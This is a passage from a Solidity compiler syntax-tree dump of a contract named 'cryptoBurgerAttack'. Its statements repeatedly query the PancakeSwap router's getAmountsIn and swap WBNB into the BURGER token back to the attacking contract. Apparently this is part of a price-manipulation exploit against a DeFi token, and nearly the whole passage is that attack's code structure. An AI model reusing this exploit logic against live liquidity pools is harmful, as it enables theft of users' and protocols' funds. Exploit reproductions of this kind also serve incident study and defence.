                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 862,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "8703:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 863,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "8732:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 859,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "8656:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 858,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "8639:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 860,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8639:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 861,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "8639:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 864,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8639:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "8624:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 866,
                  "nodeType": "ExpressionStatement",
                  "src": "8624:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 868,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "8763:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 869,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "8769:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 870,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "8777:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 872,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 871,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8790:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "8777:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 873,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "8794:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 878,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "8813:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 877,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "8805:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 876,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "8805:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 879,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "8805:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 875,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "8797:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 874,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "8797:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 880,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "8797:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 867,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "8756:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 881,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8756:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 882,
                  "nodeType": "ExpressionStatement",
                  "src": "8756:64:0"
                },
                {
                  "expression": {
                    "id": 891,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 883,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "8831:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 888,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "8910:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 889,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "8939:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 885,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "8863:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 884,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "8846:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 886,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8846:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 887,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "8846:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 890,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8846:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "8831:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 892,
                  "nodeType": "ExpressionStatement",
                  "src": "8831:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 894,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "8970:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 895,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "8976:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 896,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "8984:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 898,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 897,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8997:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "8984:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 899,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9001:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 904,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "9020:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 903,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "9012:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 902,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "9012:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 905,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "9012:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 901,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "9004:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 900,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "9004:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 906,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9004:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 893,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "8963:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 907,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8963:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 908,
                  "nodeType": "ExpressionStatement",
                  "src": "8963:64:0"
                },
                {
                  "expression": {
                    "id": 917,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 909,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "9037:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 914,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "9116:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 915,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "9145:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 911,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "9069:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 910,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "9052:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 912,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "9052:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 913,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "9052:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 916,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "9052:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "9037:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 918,
                  "nodeType": "ExpressionStatement",
                  "src": "9037:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 920,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "9176:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 921,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "9182:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 922,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "9190:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 924,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 923,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "9203:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "9190:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 925,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "9207:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 930,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "9226:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 929,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "9218:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 928,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "9218:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 931,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "9218:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 927,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "9210:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 926,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "9210:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 932,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "9210:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 919,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "9169:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 933,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "9169:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 934,
                  "nodeType": "ExpressionStatement",
                  "src": "9169:64:0"
                },
                {
                  "expression": {
                    "id": 943,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 935,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "9243:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 940,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "9322:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 941,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "9351:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 937,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "9275:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 936,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "9258:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 938,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "9258:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
